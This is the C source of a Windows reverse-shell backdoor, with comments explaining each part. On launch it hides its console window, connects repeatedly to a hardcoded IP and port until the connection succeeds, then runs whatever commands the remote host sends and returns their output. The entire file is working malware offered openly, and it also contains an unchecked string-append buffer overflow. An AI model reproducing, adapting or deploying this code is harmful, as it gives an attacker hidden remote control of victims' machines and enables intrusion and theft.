#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

// Define bzero for zeroing memory
#define bzero(p,size) (void) memset((p), 0, (size));

int sock; // Socket descriptor

// Function to handle shell commands received over the socket
void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1) {
        // Clear buffers
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        // Receive command from socket
        recv(sock, buffer, 1024, 0);

        // Check if the command is to quit
        if (strncmp("q", buffer, 1) == 0) {
            // Close socket and clean up
            closesocket(sock);
            WSACleanup();
            exit(0);
        } else {
            // Execute the received command and capture the output
            FILE *fp;
            fp = popen(buffer, "r");
            while (fgets(container, 1024, fp) != NULL) {
                // Append the command output to the total response
                strcat(total_response, container);
            }
            // Send the command output back through the socket
            send(sock, total_response, strlen(total_response), 0);
            pclose(fp); // Close the command pipe
        }
    }
}

// Main entry point for the application
int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    HWND stealth;
    // Allocate a console for the application
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    // Hide the allocated console window
    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIp;
    WSADATA wsaData;

    // Server IP address and port
    ServIp = "192.168.175.130";
    ServPort = 50005;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    // Create a socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Configure server address structure
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIp);
    ServAddr.sin_port = htons(ServPort);

    // Attempt to connect to the server
    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        // Wait for 10 milliseconds before retrying
        Sleep(10);
        goto start;
    }

    // Enter the shell command handling loop
    Shell();
}
